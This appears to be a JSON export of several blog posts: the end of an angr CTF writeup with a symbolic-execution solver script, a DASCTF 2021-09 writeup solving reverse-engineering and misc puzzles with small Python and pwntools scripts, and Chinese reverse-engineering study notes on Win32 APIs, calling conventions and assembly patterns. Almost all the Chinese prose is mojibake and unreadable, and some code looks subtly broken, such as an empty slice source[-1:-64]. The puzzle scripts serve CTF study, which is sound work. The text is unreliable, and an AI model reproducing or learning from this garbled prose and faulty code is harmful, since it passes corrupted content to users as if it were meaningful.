self.state.globals[\u0026#39;solutions\u0026#39;] = (user_input1, user_input2) proj.hook_symbol(\u0026#39;__isoc99_scanf\u0026#39;, replace_scanf()) simgr = proj.factory.simgr(start_state) def check_strncpy(state): dest_addr = state.memory.load(state.regs.esp + 4, 4, endness = proj.arch.memory_endness) src_addr = state.memory.load(state.regs.esp + 8, 4, endness = proj.arch.memory_endness) length = state.memory.load(state.regs.esp + 12, 4, endness = proj.arch.memory_endness) source = state.memory.load(src_addr, length) if not state.solver.symbolic(source) or not state.solver.symbolic(dest_addr): return False target_string = b\u0026#39;NDYNWEUJ\u0026#39; target_dest = 0x57584344 if state.satisfiable(extra_constraints = (target_dest == dest_addr, target_string == source[-1:-64])): state.add_constraints(target_dest == dest_addr, target_string == source[-1:-64]) return True return False def is_successful(state): if state.addr == 0x8048410: return check_strncpy(state) else: return False simgr.explore(find = is_successful) if simgr.found: solution_state = simgr.found[0] user_input1, user_input2 = solution_state.globals[\u0026#39;solutions\u0026#39;] print (solution_state.solver.eval(user_input1), solution_state.solver.eval(user_input2, cast_to=bytes).decode()) else: print (\u0026#34;No result\u0026#34;) ","date":"2021-09-27T21:03:03Z","permalink":"/post/angr-ctf-writeup/","title":"angr ctf writeup"},{"content":"[RE]ea5ycpp ä¸€å¼€å§‹è¿˜è¢«é€»è¾‘ç»•äº†ä¸€ä¸‹ï¼Œç»“æœå‘ç°æ ¸å¿ƒéƒ¨åˆ†å°±æ˜¯brainfuck\næœ‰ä¸€äº›ç»“æ„ä½“ï¼Œå¯ä»¥æ¢å¤ä¸€ä¸‹ï¼Œä¼šæ¯”è¾ƒå¥½çœ‹\nbrainfuckè§£æå‡ºæ¥å°±æ˜¯ç®€å•çš„åŠ å‡æ³•\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; unsigned char a[9999]; int c; int main(int argc, char **argv) { a[24] += 2; while (a[24]) { ++a[0]; --a[24]; } a[24] += 3; while (a[24]) { ++a[1]; --a[24]; } a[24] += 4; while (a[24]) { ++a[2]; --a[24]; } a[24] += 5; while (a[24]) { ++a[3]; --a[24]; } a[24] += 6; while (a[24]) { ++a[4]; --a[24]; } a[24] += 7; while (a[24]) { ++a[5]; --a[24]; } a[24] += 8; while (a[24]) { ++a[6]; --a[24]; } a[24] += 9; while (a[24]) { ++a[7]; --a[24]; } a[24] += 10; while (a[24]) { ++a[8]; --a[24]; } a[24] += 11; while (a[24]) { ++a[9]; --a[24]; } a[24] += 12; while (a[24]) { ++a[10]; --a[24]; } a[24] += 13; while (a[24]) { ++a[11]; --a[24]; } a[24] += 14; while (a[24]) { ++a[12]; --a[24]; } a[24] += 15; while (a[24]) { ++a[13]; --a[24]; } a[24] += 16; while (a[24]) { ++a[14]; --a[24]; } a[24] += 18; while (a[24]) { ++a[15]; --a[24]; } a[24] += 19; while (a[24]) { ++a[16]; --a[24]; } a[24] += 20; while (a[24]) { ++a[17]; --a[24]; } a[24] += 21; while (a[24]) { ++a[18]; --a[24]; } a[24] += 22; while (a[24]) { ++a[19]; --a[24]; } a[24] += 23; while (a[24]) { ++a[20]; --a[24]; } a[24] += 24; while (a[24]) { ++a[21]; --a[24]; } a[24] += 25; while (a[24]) { ++a[22]; --a[24]; } a[24] += 26; while (a[24]) { ++a[23]; --a[24]; } return 0; } æ ¹æ®å­—ç¬¦ä¸²å°±èƒ½çœ‹åˆ°æ¯”è¾ƒçš„ä½ç½®ï¼Œå¯†æ–‡å‡ä¸€ä¸‹å°±è¡Œ\n[RE]easy_math å‡ ä¸ªåŠ å‡æ³•è§£ä¸€ä¸‹å°±è¡Œï¼Œç”šè‡³ä¸éœ€è¦z3\nif ( v20 - v16 == 0x61536369217Di64 ) { if ( v19 - v16 == 0x586531316Fi64 ) { if ( v18 - v16 == 0x5F3631626F4Ei64 ) { if ( v16 + v18 + v19 + v20 == 0xC121F9FCC23Ai64 ) å®Œäº‹ä¹‹åéœ€è¦æŠŠflagæ‹¼ä¸€ä¸‹ï¼Œè€Œä¸”ç¬¬ä¸€ä¸ªè¾“å…¥å¥½åƒæ²¡æœ‰ç”¨ï¼Ÿ\nåæ­£æˆ‘çš„è¾“å…¥æ˜¯è¿™ä¸ª\n439904987003 107079497490813 448374321519 104755080884046 439904987003 [RE]pig_brain_king ç©äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸ªè®°å¿†æ¸¸æˆï¼Œå­—ç¬¦ä¸²è¶Šæ¥è¶Šé•¿ï¼Œé€»è¾‘æ²¡æœ‰ç»†çœ‹ï¼Œæ„Ÿè§‰å¯èƒ½æ‰¾åˆ°äº†flagç”Ÿæˆå‡½æ•°å§ï¼Œä¸è¿‡ä¸é‡è¦ï¼Œpwntoolsç©é€šå°±å®Œäº‹äº†\nfrom pwn import * p = process(\u0026#39;./pig_brain_king.exe\u0026#39;) context.log_level=\u0026#39;debug\u0026#39; for _ in range(1000): p.recvuntil(b\u0026#39;questions!\\r\\n\u0026#39;) ans = p.recvline() print (ans) p.recvuntil(b\u0026#39;enter:\u0026#39;) p.send(ans) p.interactive() è„šæœ¬æ²¡å†™å¥½ï¼Œæœ€åä¸€å…³éœ€è¦è‡ªå·±åŠ¨æ‰‹å¤åˆ¶ä¸€ä¸‹ï¼ˆæ‰‹åŠ¨ç‹—å¤´ï¼‰\nAKçš„äººæœ‰ç‚¹å¤šï¼Œæ²‰æ€ï¼ˆ\n[Misc]Girlfriend\u0026rsquo;s account ä¸€å¼€å§‹è¿˜æƒ³ç€æ‰¾ä¸ªå·¥å…·ï¼Œç„¶åå‘ç°å„ç§bug\nä½†è®¤è®¤çœŸçœŸå†™ä»£ç è½¬ç æ˜¯ä¸å¯èƒ½çš„ï¼Œè¿™è¾ˆå­ä¹Ÿä¸å¯èƒ½çš„ï¼Œç”¨vscodeæ‰¹é‡æ“ä½œä¸€æŠŠæ¢­ä¸é¦™å—\ngirl = [ (4 * 100 + 6 * 10 + 7 + 3 * 0.1 + 4 * 0.01) * 6, (1 * 100 + 6 * 10 + 9 + 0) * 9, (4 * 100 + 7 * 10 + 8 + 0) * 8, (9 * 100 + 6 * 10 + 2 + 6 * 0.1 + 4 * 0.01) * 5, (1 * 100 + 4 * 10 + 5 + 8 * 0.1 + 1 * 0.01) * 9, # ... (5 * 100 + 8 * 10 + 3 + 2 * 0.1 + 9 * 0.01) * 7, (7 * 100 + 8 * 10 + 1 + 9 * 0.1 + 0) * 5, (7 * 100 + 7 * 10 + + 0) * 4, (1 * 100 + 1 * 10 + 9 + 9 * 0.1 + 9 * 0.01) * 5, ] spend = 0 for g in girl: spend += g print (spend) è¿™è´¦å•ï¼Œå¹¸å¥½æ²¡æœ‰npy\n[Misc]blind å‹ç¼©åŒ…é‡Œæœ‰ä¿©â€œä¸€æ ·â€çš„å›¾ç‰‡ï¼Œç”¨å·¥å…·xorä¸€çœ‹ï¼Œå‘ç°åªæœ‰ä¸€ç‚¹è“è‰²ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ä¸ªç›²æ°´å°ï¼Œä¸Šç½‘æ‰¾å·¥å…·è£…ç¯å¢ƒ\noutput.png è§£å‡ºæ¥å‘ç°æ˜¯ä¸ªç›²æ–‡\nç½‘ä¸Šæ‰¾äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯æ‹¼éŸ³ç›²æ–‡ï¼Œéº»äº†\n[Crypto]ç­¾åˆ° è¯´å‡ºæ¥å¯èƒ½ä¸ä¿¡ï¼Œè¿™æ±‚è§£è„šæœ¬æ˜¯æˆ‘åœ¨è´´å§æ‰¾åˆ°çš„\u0026hellip;\ne=discrete_log(c,mod(m,n)) ","date":"2021-09-26T00:10:18Z","permalink":"/post/dasctf-2021-09-writeup/","title":"DASCTF 2021-09 Writeup"},{"content":"suibiankankan\nåŸºç¡€çŸ¥è¯† åˆ†æçš„ä¸€èˆ¬é€”å¾„å’Œç­–ç•¥ å­¦ä¼šè½¯ä»¶çš„æ“ä½œå’Œä½¿ç”¨æ–¹æ³• $\\to$ æ¨æµ‹å‡ºè½¯ä»¶çš„è®¾è®¡æ€æƒ³å’Œç¼–ç¨‹æ€è·¯ é™æ€åˆ†æï¼šé˜…è¯»åæ±‡ç¼–çš„ç¨‹åºæ¸…å•ï¼Œåˆ©ç”¨äººæœºäº¤äº’çš„æç¤ºä¿¡æ¯äº†è§£ç‰‡æ®µæ‰€å®Œæˆçš„åŠŸèƒ½ï¼Œå®è§‚äº†è§£è½¯ä»¶çš„ç¼–ç¨‹æ€è·¯ åŠ¨æ€è·Ÿè¸ªï¼šé¦–å…ˆå®Œæˆååè°ƒè¯•ï¼Œå¹¶è§£å¯†åŠ å¯†ç¨‹åºï¼Œäº†è§£åˆå§‹åŒ–å·¥ä½œï¼Œè·å¾—å„ä¸ªæ¨¡å—ä¹‹é—´çš„ä¸­é—´ç»“æœ ç²—è·Ÿè¸ªï¼šä¸è·Ÿè¸ªè°ƒç”¨ç­‰æŒ‡ä»¤ï¼Œä»…æ ¹æ®æ‰§è¡Œç»“æœåˆ†æç¨‹åºçš„åŠŸèƒ½ ç»†è·Ÿè¸ªï¼šé’ˆå¯¹æ€§è·Ÿè¸ªåˆ†æå…³é”®æ¨¡å— æ–‡æœ¬å­—ç¬¦ ASCII å’Œ Unicode Unicode æ˜¯ ASCII çš„æ‰©å±•ï¼Œæ‰€æœ‰å­—ç¬¦éƒ½æ˜¯ 16 ä½\nå­—èŠ‚å­˜å‚¨é¡ºåº å°ç«¯åºï¼ˆLittle-endianï¼‰ï¼šé«˜ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€ï¼Œä½ä½å­—èŠ‚å­˜å…¥ä½åœ°å€\nå¤§ç«¯åºï¼ˆBig-endianï¼‰ï¼šé«˜ä½å­—èŠ‚å­˜å…¥ä½åœ°å€ï¼Œä½ä½å­—èŠ‚å­˜å…¥é«˜åœ°å€\nå­—èŠ‚åº 0 1 2 3 å¤§ç«¯åº 12 34 56 78 å°ç«¯åº 78 56 34 12 Windows Win 32 API 32ä½APIä¸64ä½APIåœ¨åç§°å’ŒåŠŸèƒ½ä¸ŠåŸºæœ¬æ²¡æœ‰å˜åŒ–\nWindowsè¿è½¬æ ¸å¿ƒä¸ºDLLåŠ¨æ€é“¾æ¥åº“\nKERNEL32.DLLï¼šæ“ä½œç³»ç»Ÿæ ¸å¿ƒåŠŸèƒ½æœåŠ¡ï¼Œè¿›ç¨‹ä¸çº¿ç¨‹æ§åˆ¶ã€å†…å­˜ç®¡ç†ã€æ–‡ä»¶è®¿é—®ç­‰ USER32.DLLï¼šè´Ÿè´£å¤„ç†ç”¨æˆ·æ¥å£ï¼ŒåŒ…æ‹¬é”®ç›˜å’Œé¼ æ ‡è¾“å…¥ã€çª—å£å’Œèœå•ç®¡ç†ç­‰ GDIï¼šå›¾å½¢è®¾å¤‡æ¥å£ï¼Œå…è®¸ç¨‹åºåœ¨å±å¹•å’Œæ‰“å°æœºä¸Šæ˜¾ç¤ºæ–‡æœ¬å’Œå›¾å½¢ Windowsæ¶ˆæ¯æœºåˆ¶ Windowsä½¿ç”¨Messageæä¾›åº”ç”¨ç¨‹åºä¸åº”ç”¨ç¨‹åºã€åº”ç”¨ç¨‹åºä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„é€šä¿¡\nå¸¸ç”¨çš„å‡½æ•°å¦‚ä¸‹ï¼š\nSendMessage è°ƒç”¨ä¸€ä¸ªçª—å£çš„çª—å£å‡½æ•°ï¼Œå°†ä¸€æ¡æ¶ˆæ¯å‘é€ç»™é‚£ä¸ªçª—å£ã€‚é™¤éæ¶ˆæ¯å¤„ç†å®Œæ¯•ï¼Œå¦åˆ™ä¸ä¼šè¿”å›\nLRESULT SendMessage( HWND hwnd,\t// ç›®çš„çª—å£çš„å¥æŸ„ UINT Msg,\t// æ¶ˆæ¯æ ‡è¯†ç¬¦ WPARAM wParam,\t// æ¶ˆæ¯çš„WPARAMåŸŸ LPARAM lParam\t// æ¶ˆæ¯çš„LPARAMåŸŸ ); è¿”å›å€¼ï¼šæ¶ˆæ¯æŠ•é€’æˆåŠŸï¼Œè¿”å›éé›¶\nWM_COMMAND å½“ç”¨æˆ·ä»èœå•æˆ–æŒ‰é’®ä¸­é€‰æ‹©ä¸€æ¡å‘½ä»¤æˆ–è€…ä¸€ä¸ªæ§ä»¶æ—¶è¯¥æ¶ˆæ¯è¢«å‘é€ç»™å®ƒçš„çˆ¶çª—å£ï¼Œæˆ–è€…å½“ä¸€ä¸ªå¿«æ·é”®è¢«é‡Šæ”¾æ—¶å‘é€è¯¥æ¶ˆæ¯ã€‚\nWM_COMMAND wNotifyCode = HIWORD(wParam);\t// é€šå‘Šå‡½æ•° wID = LOWORD(wParam);\t// èœå•æ¡ç›®ã€æ§ä»¶æˆ–å¿«æ·é”®çš„æ ‡è¯†ç¬¦ hwndCtl = (HWND) lParam;\t// æ§ä»¶å¥æŸ„ è¿”å›å€¼ï¼šå¦‚æœåº”ç”¨ç¨‹åºå¤„ç†è¿™æ¡æ¶ˆæ¯ï¼Œåˆ™è¿”å›å€¼ä¸ºé›¶\nWM_DESTORY å½“ä¸€ä¸ªçª—å£è¢«é”€æ¯æ—¶å‘é€è¯¥æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯å¯¹åº” 0x02ï¼Œæ²¡æœ‰å‚æ•°\nè¿”å›å€¼ï¼šå¦‚æœåº”ç”¨ç¨‹åºå¤„ç†è¿™æ¡æ¶ˆæ¯ï¼Œåˆ™è¿”å›å€¼ä¸ºé›¶\nWM_GETTEXT å½“éœ€è¦å°†ä¸€ä¸ªçª—å£çš„æ–‡æœ¬å¤åˆ¶åˆ°ä¸€ä¸ªç”±å‘¼å«ç¨‹åºæä¾›çš„ç¼“å†²åŒºä¸­æ—¶ï¼Œå‘é€è¯¥æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯å¯¹åº” 0x0D\nWM_GETTEXT wParam = (WPARAM) cchTextMax;\t// éœ€è¦å¤åˆ¶çš„å­—ç¬¦æ•° lParam = (LPARAM) lpszText;\t// æ¥æ”¶æ–‡æœ¬çš„ç¼“å†²åŒºåœ°å€ è¿”å›å€¼ï¼šè¢«å¤åˆ¶çš„å­—ç¬¦æ•°\nWM_QUIT å½“åº”ç”¨ç¨‹åºè°ƒç”¨ PostQuitMessage æ—¶ï¼Œç”Ÿæˆ WM_QUITæ¶ˆæ¯ï¼Œå¯¹åº” 0x12\nWM_QUIT nExitCode = (int) wParam;\t// é€€å‡ºä»£ç  æ— è¿”å›å€¼\nWM_LBUTTONDOWN å…‰æ ‡åœåœ¨çª—å£å®¢æˆ·åŒºä¸”ç‚¹å‡»å·¦é”®æ—¶ï¼Œå‘é€æ­¤æ¶ˆæ¯\nå¦‚æœé¼ æ ‡æœªæ•æ‰ï¼Œå°†ä¸‹å‘ç»™å…‰æ ‡ä¸‹çš„çª—å£ï¼Œå¦åˆ™å‘é€ç»™æ•è·é¼ æ ‡åŠ¨ä½œçš„çª—å£\nå¯¹åº” 0x201\nWM_LBUTTONDOWN fwkeys = wParam;\t// keyæ——å¸œ xPos = LOWORD(lParam);\t// å…‰æ ‡çš„æ°´å¹³ä½ç½® yPos = HIWORD(lParam);\t// å…‰æ ‡çš„å‚ç›´ä½ç½® è¿”å›å€¼ï¼šå¦‚æœåº”ç”¨ç¨‹åºå¤„ç†äº†è¿™æ¡æ¶ˆæ¯ï¼Œè¿”å›å€¼ä¸ºé›¶\nè™šæ‹Ÿå†…å­˜ åº”ç”¨ç¨‹åºä¸ä¼šç›´æ¥è®¿é—®ç‰©ç†åœ°å€ è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨é€šè¿‡è™šæ‹Ÿåœ°å€çš„è®¿é—®è¯·æ±‚æ¥æ§åˆ¶æ‰€æœ‰çš„ç‰©ç†åœ°å€è®¿é—® æ¯ä¸ªåº”ç”¨éƒ½æœ‰ç‹¬ç«‹çš„å¯»å€ç©ºé—´ï¼Œä¸åŒåº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´æ˜¯å½¼æ­¤éš”ç¦»çš„ DLLç¨‹åºæ²¡æœ‰ç§æœ‰ç©ºé—´ï¼Œæ€»æ˜¯è¢«æ˜ å°„åˆ°å…¶ä»–åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸­ï¼Œä½œä¸ºç¨‹åºçš„ä¸€éƒ¨åˆ†è¿è¡Œ åŠ¨æ€åˆ†ææŠ€æœ¯ é€†å‘åˆ†ææŠ€æœ¯ Win32 å¯åŠ¨ ç¨‹åºå…ˆæ‰§è¡Œå¯åŠ¨ä»£ç ï¼Œéšåè°ƒç”¨ WinMain å‡½æ•°\nå®ä¾‹ä¸­çš„ç³»ç»Ÿè°ƒç”¨ï¼š\nCall KERNEL32.GetVersion ; ç¡®å®šWindowsç³»ç»Ÿç‰ˆæœ¬ Call KERNEL32.GetCommandLineA ; æŒ‡å‘ç³»ç»Ÿçš„å®Œæ•´å‘½ä»¤è¡Œçš„æŒ‡é’ˆ Call KERNEL32.GetStartupInfoA ; è·å–ä¸€ä¸ªè¿›ç¨‹çš„å¯åŠ¨ä¿¡æ¯ Call KERNEL32.GetModuleHandleA ; è¿”å›è¿›ç¨‹åœ°å€ç©ºé—´æ‰§è¡Œæ–‡ä»¶åŸºåœ°å€ call 00401000 ; è°ƒç”¨WinMain call 004012EC ; é€€å‡ºç¨‹åº ret é€šå¸¸æ— éœ€å…³æ³¨å¯åŠ¨ï¼Œç›´æ¥æŸ¥çœ‹ WinMain å³å¯\nå‡½æ•°è°ƒç”¨ ç¼–è¯‘å™¨é€šå¸¸ä½¿ç”¨ call å’Œ ret æŒ‡ä»¤æ¥è°ƒç”¨å‡½æ•°\ncall æŒ‡ä»¤å°†å…¶ä¹‹åçš„æŒ‡ä»¤åœ°å€å‹å…¥æ ˆé¡¶ï¼Œret æŒ‡ä»¤åˆ™è¿”å›åˆ°è°ƒç”¨ä½ç½®\næœ‰æ—¶å¯èƒ½åˆ©ç”¨å¯„å­˜å™¨è¿›è¡Œé—´æ¥è°ƒç”¨ï¼Œå¦‚ï¼š call eax\nå‚æ•°ä¼ é€’ æ ˆ è°ƒç”¨å‡½æ•°æ—¶ï¼Œå°†å‚æ•°å‹å…¥æ ˆä¸­\nå¯¹äºä¸åŒè¯­è¨€ï¼Œæœ‰ä¸åŒçš„è°ƒç”¨çº¦å®š\nç±»å‹ C/C++(__cdecl) pascal stdcall fastcall å‚æ•°ä¼ é€’é¡ºåº ä»å³å‘å·¦ ä»å·¦å‘å³ ä»å³å‘å·¦ ä½¿ç”¨å¯„å­˜å™¨å’Œæ ˆ å¹³è¡¡æ ˆ è°ƒç”¨è€… å­ç¨‹åº å­ç¨‹åº å­ç¨‹åº VARARG æ˜¯ å¦ å…è®¸* VARARGè¡¨ç¤ºå‚æ•°ä¸ªæ•°å¯ä»¥ä¸ç¡®å®š\nstdcallä¸­ï¼Œå¦‚æœå‚æ•°ä¸ªæ•°ä¸ç¡®å®šï¼Œéœ€è¦ç”±è°ƒç”¨ç¨‹åºæ¥å¹³è¡¡æ ˆ\nç¨‹åºæ‰§è¡Œè¿‡ç¨‹ï¼š\nè°ƒç”¨è€…å°†å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶åº”è¿”å›çš„åœ°å€ã€å‚æ•°å‹å…¥æ ˆ å‡½æ•°ä½¿ç”¨ ebp æŒ‡é’ˆ+åç§»é‡å¯¹æ ˆä¸­çš„å‚æ•°è¿›è¡Œå¯»å€å¹¶å–å‡ºï¼Œå®Œæˆæ“ä½œ å­ç¨‹åºä½¿ç”¨ ret æˆ– retf æŒ‡ä»¤è¿”å›ï¼Œ eip ç½®ä¸ºæ ˆä¸­ä¿å­˜çš„åœ°å€ï¼Œå¹¶ç»§ç»­æ‰§è¡Œ æ ˆçš„å»ºç«‹è¿‡ç¨‹ï¼ˆä¸¤ä¸ªå‚æ•°æ—¶ï¼‰ï¼š\nå…ˆå°† arg2 å‹æ ˆï¼Œesp=K-04h å°† arg1 å‹æ ˆï¼Œesp=K-08h æ‰§è¡Œ call ï¼ŒæŠŠè¿”å›åœ°å€å‹æ ˆï¼Œesp=K-0Ch ä¸ºäº†ç¨‹åºèƒ½å¤Ÿæ¢å¤ï¼Œå°† ebp å‹æ ˆï¼Œesp=K-10h move ebp, espï¼Œå°†å½“å‰çš„æ ˆé¡¶è®¾ç½®ä¸ºæ ˆåº• sub esp, 8 ï¼Œå®šä¹‰å±€éƒ¨å˜é‡ï¼Œä¸¤ä¸ªå˜é‡åˆ†åˆ«ä¸º [esp-4] å’Œ [esp-8] å‡½æ•°ç»“æŸæ—¶ï¼Œadd esp, 8 é‡Šæ”¾å±€éƒ¨å˜é‡å ç”¨ï¼Œæˆ–è€…ä½¿ç”¨ ret 8 æ¥é‡Šæ”¾ è¿˜å¯ä»¥ç”¨enterå’ŒleaveæŒ‡ä»¤ç»´æŠ¤\nenter æŒ‡ä»¤ï¼špush ebpï¼Œmov ebp, espï¼Œsub esp, xxx\nleave æŒ‡ä»¤ï¼šadd esp, xxxï¼Œpop ebp\nå¯„å­˜å™¨ é€šå¸¸éµå¾ª fastcall è§„èŒƒ\nVC++ï¼šå·¦è¾¹ä¸¤ä¸ªå‚æ•°åˆ†åˆ«å­˜å…¥ ecx, edx ä¸­ï¼Œå…¶ä½™å‹æ ˆ Borland Delphi/C++ï¼šå·¦è¾¹ä¸‰ä¸ªå‚æ•°åˆ†åˆ«å­˜å…¥ eax, edx, ecx ä¸­ï¼Œå…¶ä½™æŒ‰PASCALæ–¹å¼å‹æ ˆ C++éé™æ€ç±»æˆå‘˜é»˜è®¤è°ƒç”¨ thiscall ï¼Œå¯¹è±¡çš„æ¯ä¸ªå‡½æ•°éšå«æ¥å— this å‚æ•°ï¼Œä½¿ç”¨ eax å­˜æ”¾ï¼Œå…¶ä½™å‚æ•°ä»å³åˆ°å·¦å‹æ ˆ\nåç§°ä¿®é¥°çº¦å®š ä¸ºäº†æ“ä½œç¬¦å’Œå‡½æ•°é‡è½½ï¼ŒC++ç¼–è¯‘å™¨ä¼šæŒ‰ç…§è§„åˆ™ä¿®æ”¹å…¥å£ç‚¹çš„ç¬¦å·åï¼Œä»è€Œå…è®¸åŒä¸€ä¸ªåå­—æœ‰å¤šä¸ªç”¨æ³•ã€‚\nCçš„è§„åˆ™å¦‚ä¸‹ï¼š\nstdcallè°ƒç”¨çº¦å®šåœ¨è¾“å‡ºå‡½æ•°åå‰åŠ ä¸‹åˆ’çº¿ï¼Œåœ¨åé¢åŠ @ï¼Œæ ¼å¼ä¸º _functionname@number __cdeclè°ƒç”¨çº¦å®šæ ¼å¼ä¸º _functionname Fastcallè°ƒç”¨çº¦å®šæ ¼å¼ä½ @functionname@number å‡ä¸æ”¹å˜å¤§å°å†™\nC++è§„åˆ™å¦‚ä¸‹ï¼š\nstdcallè°ƒç”¨çº¦å®šä»¥ ? å¼€å¤´ï¼Œå‡½æ•°ååä»¥ @@YG æ ‡è¯†å‚æ•°è¡¨å¼€å§‹ï¼Œåè·Ÿå‚æ•°è¡¨ï¼Œå‚æ•°è¡¨ç¬¬ä¸€é¡¹ä½è¿”å›å€¼ç±»å‹ï¼Œå…¶åä¾æ¬¡ä¸ºå‚æ•°çš„æ•°æ®ç±»å‹ï¼ŒæŒ‡é’ˆæ ‡è¯†åœ¨å…¶æ‰€æŒ‡æ•°æ®ç±»å‹å‰ï¼Œå‚æ•°è¡¨åï¼Œä»¥ @Z æ ‡è¯†æ•´ä¸ªåå­—çš„ç»“æŸï¼Œè‹¥æ— å‚æ•°ï¼Œåˆ™ä»¥ Z ç»“æŸã€‚æ ¼å¼ä¸º ?functionname@@YG******@Z æˆ– ?functionname@@YG*XZ __cdeclè°ƒç”¨å°† @@YG æ›¿æ¢ä¸º @@YA Fastcallè°ƒç”¨å°† @@YG æ›¿æ¢ä¸º @@YI è¿”å›å€¼ returnæ“ä½œè¿”å› å­˜æ”¾åœ¨ eax å¯„å­˜å™¨ä¸­ï¼Œé«˜32ä½å­˜æ”¾åœ¨ edx ä¸­\nä¼ å¼•ç”¨æ–¹å¼è¿”å› ä¼ å¼•ç”¨è°ƒç”¨æ–¹å¼å°†å˜é‡çš„åœ°å€ä¼ é€’ç»™å‡½æ•°ï¼Œå¯ä»¥åœ¨å­å‡½æ•°ä¸­ä¿®æ”¹è¯¥å†…å­˜å•å…ƒä¸­å˜é‡çš„å€¼ï¼Œå› æ­¤å…è®¸ä¿®æ”¹åŸå§‹å˜é‡\næ•°æ®ç»“æ„ å±€éƒ¨å˜é‡ å‡½æ•°å†…éƒ¨å®šä¹‰çš„ä¸€ä¸ªå˜é‡ï¼Œä½œç”¨åŸŸå’Œç”Ÿå‘½å‘¨æœŸä»…å±€é™äºè¯¥å‡½æ•°å†…\næ ˆå­˜æ”¾ å…ˆå°†å‚æ•°å‹å…¥æ ˆä¸­ï¼Œå†ä¿®æ”¹ ebp ï¼Œæœ€åå‡å° espã€‚å› æ­¤ [ebp+**h] è¡¨ç¤ºå‚æ•°ï¼Œ [ebp-**h] è¡¨ç¤ºå±€éƒ¨å˜é‡\nå¯„å­˜å™¨å­˜æ”¾ æœ‰ 6 ä¸ªé€šç”¨å¯„å­˜å™¨å°½å¯èƒ½æœ‰æ•ˆåœ°å­˜æ”¾å±€éƒ¨å˜é‡ï¼Œ å› æ­¤éœ€è¦æ³¨æ„ç¡®å®šå½“å‰çš„å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å˜é‡æ˜¯å“ªä¸ªå˜é‡\nå…¨å±€å˜é‡ å±€éƒ¨å˜é‡å­˜æ”¾åœ¨æ ˆä¸­ï¼Œè€Œå…¨å±€å˜é‡å­˜æ”¾åœ¨å†…å­˜åŒºä¸­\nç‰ˆæœ¬æ ‡è®°ç­‰å¸¸æ•°é€šå¸¸ä¸ºå…¨å±€å˜é‡\nå…¨å±€å˜é‡é€šå¸¸å­˜æ”¾åœ¨æ•°æ®åŒºå— .data çš„ä¸€ä¸ªå›ºå®šåœ°å€å¤„ï¼Œç¨‹åºä½¿ç”¨å›ºå®šçš„ç¡¬ç¼–ç åœ°å€è¿›è¡Œå¯»å€\nå¦‚æœåœ¨åªè¯»åŒºå—ï¼Œè¯´æ˜æ˜¯ä¸€ä¸ªå¸¸é‡\næ•°ç»„ ä¸€èˆ¬é€šè¿‡åŸºå€+å˜å€å®ç°å¯»å€ï¼Œå¦‚ï¼š\nmov eax, [407030h + eax] é—´æ¥å¯»å€ä¸€èˆ¬ç”¨äºç»™æ•°ç»„å’Œç»“æ„èµ‹å€¼ï¼Œ[base+n] æ ¹æ®nçš„ä¸åŒå¯¹ç»“æ„ä¸­çš„ç›¸åº”å•å…ƒèµ‹å€¼ã€‚\n0040101D lea esi, dword ptr [esp+8] 00401021 mov edi, 3 00401026 mov eas, dword ptr [esi] ... 00401036 add esi, 4 00401039 dec edi 0040103A jnz short 00401026 è™šå‡½æ•° C++é¢å‘å¯¹è±¡ä¸­ï¼Œæœ€é‡è¦çš„æ¦‚å¿µå°±æ˜¯è™šå‡½æ•°\nè™šå‡½æ•°æ˜¯ç¨‹åºè¿è¡Œæ—¶å®šä¹‰çš„å‡½æ•°ï¼Œå…¶åœ°å€ä¸èƒ½åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œåªèƒ½åœ¨è°ƒç”¨å³å°†è¿›è¡Œæ—¶ç¡®å®šã€‚è™šå‡½æ•°çš„å¼•ç”¨å­˜æ”¾åœ¨ä¸“ç”¨æ•°ç»„â€”â€”è™šå‡½æ•°è¡¨ï¼ˆVirtual Tableï¼ŒVTBLï¼‰ä¸­ã€‚\nè°ƒç”¨æ—¶é¦–å…ˆé€šè¿‡è™šå‡½æ•°æŒ‡é’ˆæ‰¾åˆ°è™šå‡½æ•°è¡¨çš„åœ°å€ï¼Œç„¶ååœ¨è™šå‡½æ•°è¡¨ä¸­æ‰¾åˆ°è¯¥å‡½æ•°çš„å…¥å£åœ°å€ï¼Œæœ€åè¿›è¡Œè°ƒç”¨ã€‚\næ§åˆ¶è¯­å¥ if-else æ±‡ç¼–å½¢å¼é€šå¸¸ä¸º\ncmp a, bjz 0040xxxxh ; (jnz) å¯ä»¥ç”¨ test eax, eax æ›¿ä»£ cmp ï¼Œè¯¥è¯­å¥ï¼ˆç›¸å½“äºé€»è¾‘ä¸è¿ç®—ï¼‰è¡¨ç¤ºå½“ eax ä¸º 0 æ—¶ï¼Œè®¾ç½® ZF ä¸º 1ï¼Œjz åˆ™è¡¨ç¤º ZF ä½ä¸º 1 æ—¶è·³è½¬\nswitch-case æ— ä¼˜åŒ–ç‰ˆæœ¬\n0040101D cmp [ebp-08], 01 ; case 100401021 je 0040103100401023 cmp [ebp-08], 02 ; case 200401027 je 0040104000401029 cmp [ebp-08], 0A ; case 100040102D je 0040104F0040102F jmp 0040105E ; default ä½¿ç”¨ dec æŒ‡ä»¤æ›¿ä»£ cmp\nmov eax, [esp+08]dec eax ; case 1je 0040xxxxdec eax ; case 2je 0040xxxxsub eax, 00000008 ; case 10je 0040xxxx è·³è½¬è¡¨å®ç°ï¼ˆcaseçš„å–å€¼ä¸ºç®—æœ¯çº§æ•°æ—¶ï¼‰\njmp dword ptr [4*eax+004010B0] ; è·³è½¬è¡¨ è½¬ç§»æŒ‡ä»¤æœºå™¨ç è®¡ç®— ä½ç§»é‡=ç›®çš„åœ°å€-èµ·å§‹åœ°å€-è·³è½¬æŒ‡ä»¤é•¿åº¦\nè½¬ç§»æŒ‡ä»¤æœºå™¨ç =è½¬ç§»ç±»åˆ«æœºå™¨ç 